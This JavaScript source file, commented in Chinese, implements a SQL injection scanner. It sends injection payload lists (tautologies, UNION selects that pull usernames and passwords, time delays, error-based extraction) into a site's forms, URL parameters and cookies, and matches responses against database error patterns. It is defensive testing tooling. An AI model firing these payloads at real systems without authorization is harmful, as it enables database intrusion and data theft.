/**
 * SQL注入漏洞检测器
 * 本地化程度：100%
 * 检测各种SQL注入漏洞类型
 */

const axios = require('axios');

class SQLInjectionAnalyzer {
  constructor() {
    // SQL注入测试载荷
    this.payloads = {
      // 基础SQL注入测试
      basic: [
        "'",
        "\"",
        "')",
        "';",
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "' OR 1=1#",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "' AND 1=0 UNION SELECT NULL, username, password FROM users--"
      ],
      
      // 时间盲注测试
      timeBased: [
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'; pg_sleep(5)--",
        "' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)--"
      ],
      
      // 布尔盲注测试
      booleanBased: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a'--",
        "' AND 'a'='b'--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
      ],
      
      // 联合查询注入
      unionBased: [
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT table_name FROM information_schema.tables--"
      ],
      
      // 错误注入测试
      errorBased: [
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
      ]
    };
    
    // SQL错误特征
    this.errorSignatures = [
      // MySQL错误
      /mysql_fetch_array\(\)/i,
      /mysql_num_rows\(\)/i,
      /mysql_query\(\)/i,
      /You have an error in your SQL syntax/i,
      /Warning.*mysql_.*\(\)/i,
      /MySQL server version for the right syntax/i,
      
      // PostgreSQL错误
      /PostgreSQL.*ERROR/i,
      /Warning.*pg_.*\(\)/i,
      /valid PostgreSQL result/i,
      /Npgsql\./i,
      
      // MSSQL错误
      /Driver.*SQL[\-\_\ ]*Server/i,
      /OLE DB.*SQL Server/i,
      /(\W|\A)SQL Server.*Driver/i,
      /Warning.*mssql_.*\(\)/i,
      /Microsoft OLE DB Provider for ODBC Drivers/i,
      /Microsoft OLE DB Provider for SQL Server/i,
      /Incorrect syntax near/i,
      /Unclosed quotation mark after the character string/i,
      
      // Oracle错误
      /\bORA-[0-9][0-9][0-9][0-9]/i,
      /Oracle error/i,
      /Oracle.*Driver/i,
      /Warning.*oci_.*\(\)/i,
      /Warning.*ora_.*\(\)/i,
      
      // 通用SQL错误
      /SQL syntax.*MySQL/i,
      /Warning.*mysql_query\(\)/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /com\.mysql\.jdbc/i,
      /Zend_Db_(Adapter|Statement)/i,
      /Pdo[./_\\]Mysql/i,
      /MySqlException/i,
      /SQLSTATE\[\d+\]/i,
      /\[SQL Server\]/i,
      /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
      /\[SQLServer JDBC Driver\]/i,
      /\[SqlException/i,
      /System\.Data\.SqlClient\.SqlException/i,
      /Unclosed quotation mark after the character string/i,
      /quoted string not properly terminated/i
    ];
    
    // 时间阈值（毫秒）
    this.timeThreshold = 5000;
  }

  /**
   * 执行SQL注入检测
   */
  async analyze(page, baseUrl) {
    try {
      console.log('🔍 开始SQL注入漏洞检测...');
      
      const results = {
        vulnerabilities: [],
        summary: {
          totalTests: 0,
          vulnerableEndpoints: 0,
          riskLevel: 'low'
        },
        details: {
          forms: [],
          parameters: [],
          cookies: []
        }
      };
      
      // 检测表单中的SQL注入
      const formVulns = await this.detectFormSQLInjection(page);
      results.details.forms = formVulns;
      results.vulnerabilities.push(...formVulns);
      
      // 检测URL参数中的SQL注入
      const paramVulns = await this.detectParameterSQLInjection(baseUrl);
      results.details.parameters = paramVulns;
      results.vulnerabilities.push(...paramVulns);
      
      // 检测Cookie中的SQL注入
      const cookieVulns = await this.detectCookieSQLInjection(page, baseUrl);
      results.details.cookies = cookieVulns;
      results.vulnerabilities.push(...cookieVulns);
      
      // 计算总结信息
      results.summary = this.calculateSummary(results.vulnerabilities);
      
      console.log(`✅ SQL注入检测完成，发现 ${results.vulnerabilities.length} 个潜在漏洞`);
      
      return results;
    } catch (error) {
      console.error('❌ SQL注入检测失败:', error);
      throw error;
    }
  }

  /**
   * 检测表单中的SQL注入
   */
  async detectFormSQLInjection(page) {
    try {
      const forms = await page.evaluate(() => {
        const formElements = document.querySelectorAll('form');
        const formData = [];
        
        formElements.forEach((form, index) => {
          const inputs = form.querySelectorAll('input, textarea, select');
          const formInfo = {
            index,
            action: form.action || window.location.href,
            method: (form.method || 'GET').toUpperCase(),
            inputs: []
          };
          
          inputs.forEach(input => {
            if (input.type !== 'submit' && input.type !== 'button' && input.name) {
              formInfo.inputs.push({
                name: input.name,
                type: input.type,
                value: input.value || ''
              });
            }
          });
          
          if (formInfo.inputs.length > 0) {
            formData.push(formInfo);
          }
        });
        
        return formData;
      });
      
      const vulnerabilities = [];
      
      for (const form of forms) {
        for (const input of form.inputs) {
          const vulns = await this.testInputForSQLInjection(form, input);
          vulnerabilities.push(...vulns);
        }
      }
      
      return vulnerabilities;
    } catch (error) {
      console.error('表单SQL注入检测失败:', error);
      return [];
    }
  }

  /**
   * 测试单个输入字段的SQL注入
   */
  async testInputForSQLInjection(form, input) {
    const vulnerabilities = [];
    
    // 测试不同类型的SQL注入载荷
    for (const [type, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 3)) { // 限制测试数量
        try {
          const testData = this.buildFormData(form, input, payload);
          const startTime = Date.now();
          
          const response = await this.sendRequest(form.action, form.method, testData);
          const responseTime = Date.now() - startTime;
          
          const vulnerability = this.analyzeResponse(response, responseTime, {
            type: 'form',
            form: form,
            input: input.name,
            payload,
            injectionType: type
          });
          
          if (vulnerability) {
            vulnerabilities.push(vulnerability);
          }
          
          // 避免过于频繁的请求
          await this.delay(100);
          
        } catch (error) {
          console.warn(`测试载荷失败: ${payload}`, error.message);
        }
      }
    }
    
    return vulnerabilities;
  }

  /**
   * 检测URL参数中的SQL注入
   */
  async detectParameterSQLInjection(baseUrl) {
    try {
      const url = new URL(baseUrl);
      const params = url.searchParams;
      const vulnerabilities = [];
      
      if (params.size === 0) {
        return vulnerabilities;
      }
      
      for (const [paramName, paramValue] of params.entries()) {
        const vulns = await this.testParameterForSQLInjection(baseUrl, paramName, paramValue);
        vulnerabilities.push(...vulns);
      }
      
      return vulnerabilities;
    } catch (error) {
      console.error('URL参数SQL注入检测失败:', error);
      return [];
    }
  }

  /**
   * 测试URL参数的SQL注入
   */
  async testParameterForSQLInjection(baseUrl, paramName, originalValue) {
    const vulnerabilities = [];
    
    for (const [type, payloads] of Object.entries(this.payloads)) {
      for (const payload of payloads.slice(0, 2)) { // 限制测试数量
        try {
          const testUrl = this.buildTestUrl(baseUrl, paramName, payload);
          const startTime = Date.now();
          
          const response = await this.sendRequest(testUrl, 'GET');
          const responseTime = Date.now() - startTime;
          
          const vulnerability = this.analyzeResponse(response, responseTime, {
            type: 'parameter',
            parameter: paramName,
            originalValue,
            payload,
            injectionType: type,
            url: testUrl
          });
          
          if (vulnerability) {
            vulnerabilities.push(vulnerability);
          }
          
          await this.delay(100);
          
        } catch (error) {
          console.warn(`参数测试失败: ${paramName}=${payload}`, error.message);
        }
      }
    }
    
    return vulnerabilities;
  }

  /**
   * 检测Cookie中的SQL注入
   */
  async detectCookieSQLInjection(page, baseUrl) {
    try {
      const cookies = await page.cookies();
      const vulnerabilities = [];
      
      for (const cookie of cookies) {
        const vulns = await this.testCookieForSQLInjection(page, baseUrl, cookie);
        vulnerabilities.push(...vulns);
      }
      
      return vulnerabilities;
    } catch (error) {
      console.error('Cookie SQL注入检测失败:', error);
      return [];
    }
  }

  /**
   * 测试Cookie的SQL注入
   */
  async testCookieForSQLInjection(page, baseUrl, cookie) {
    const vulnerabilities = [];
    
    for (const payload of this.payloads.basic.slice(0, 2)) {
      try {
        // 设置测试Cookie
        await page.setCookie({
          name: cookie.name,
          value: payload,
          domain: cookie.domain,
          path: cookie.path
        });
        
        const startTime = Date.now();
        const response = await page.goto(baseUrl, { waitUntil: 'networkidle2' });
        const responseTime = Date.now() - startTime;
        
        const content = await page.content();
        
        const vulnerability = this.analyzeResponse({
          data: content,
          status: response.status(),
          headers: response.headers()
        }, responseTime, {
          type: 'cookie',
          cookie: cookie.name,
          originalValue: cookie.value,
          payload,
          injectionType: 'basic'
        });
        
        if (vulnerability) {
          vulnerabilities.push(vulnerability);
        }
        
        // 恢复原始Cookie
        await page.setCookie({
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path
        });
        
        await this.delay(200);
        
      } catch (error) {
        console.warn(`Cookie测试失败: ${cookie.name}`, error.message);
      }
    }
    
    return vulnerabilities;
  }

  /**
   * 分析响应以检测SQL注入漏洞
   */
  analyzeResponse(response, responseTime, context) {
    const content = response.data || '';
    const status = response.status || 200;
    
    // 检查SQL错误特征
    const errorMatch = this.checkSQLErrors(content);
    if (errorMatch) {
      return {
        type: 'sql_injection',
        severity: 'high',
        confidence: 'high',
        context,
        evidence: {
          type: 'error_based',
          errorPattern: errorMatch.pattern,
          errorText: errorMatch.text,
          responseTime,
          statusCode: status
        },
        description: `检测到SQL错误信息，可能存在SQL注入漏洞`,
        recommendation: '验证和过滤用户输入，使用参数化查询'
      };
    }
    
    // 检查时间盲注
    if (context.injectionType === 'timeBased' && responseTime > this.timeThreshold) {
      return {
        type: 'sql_injection',
        severity: 'medium',
        confidence: 'medium',
        context,
        evidence: {
          type: 'time_based',
          responseTime,
          threshold: this.timeThreshold,
          statusCode: status
        },
        description: `响应时间异常延长，可能存在时间盲注漏洞`,
        recommendation: '验证和过滤用户输入，使用参数化查询'
      };
    }
    
    // 检查布尔盲注（需要对比正常响应）
    if (context.injectionType === 'booleanBased') {
      const suspiciousPatterns = [
        /login\s*successful/i,
        /welcome/i,
        /dashboard/i,
        /admin/i
      ];
      
      const hasSuspiciousContent = suspiciousPatterns.some(pattern => pattern.test(content));
      if (hasSuspiciousContent) {
        return {
          type: 'sql_injection',
          severity: 'medium',
          confidence: 'low',
          context,
          evidence: {
            type: 'boolean_based',
            suspiciousContent: true,
            responseTime,
            statusCode: status
          },
          description: `可能存在布尔盲注漏洞`,
          recommendation: '验证和过滤用户输入，使用参数化查询'
        };
      }
    }
    
    return null;
  }

  /**
   * 检查SQL错误特征
   */
  checkSQLErrors(content) {
    for (const pattern of this.errorSignatures) {
      const match = content.match(pattern);
      if (match) {
        return {
          pattern: pattern.toString(),
          text: match[0]
        };
      }
    }
    return null;
  }

  /**
   * 构建表单数据
   */
  buildFormData(form, targetInput, payload) {
    const formData = new URLSearchParams();
    
    form.inputs.forEach(input => {
      if (input.name === targetInput.name) {
        formData.append(input.name, payload);
      } else {
        formData.append(input.name, input.value || 'test');
      }
    });
    
    return formData;
  }

  /**
   * 构建测试URL
   */
  buildTestUrl(baseUrl, paramName, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(paramName, payload);
    return url.toString();
  }

  /**
   * 发送HTTP请求
   */
  async sendRequest(url, method = 'GET', data = null) {
    const config = {
      method,
      url,
      timeout: 10000,
      validateStatus: () => true, // 接受所有状态码
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    };
    
    if (method === 'POST' && data) {
      config.data = data;
      config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
    }
    
    const response = await axios(config);
    return response;
  }

  /**
   * 计算检测总结
   */
  calculateSummary(vulnerabilities) {
    const totalTests = vulnerabilities.length;
    const vulnerableEndpoints = new Set(
      vulnerabilities.map(v => `${v.context.type}:${v.context.input || v.context.parameter || v.context.cookie}`)
    ).size;
    
    const severities = vulnerabilities.map(v => v.severity);
    let riskLevel = 'low';
    
    if (severities.includes('high')) {
      riskLevel = 'high';
    } else if (severities.includes('medium')) {
      riskLevel = 'medium';
    }
    
    return {
      totalTests,
      vulnerableEndpoints,
      riskLevel,
      highRiskCount: severities.filter(s => s === 'high').length,
      mediumRiskCount: severities.filter(s => s === 'medium').length,
      lowRiskCount: severities.filter(s => s === 'low').length
    };
  }

  /**
   * 延迟函数
   */
  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = SQLInjectionAnalyzer;
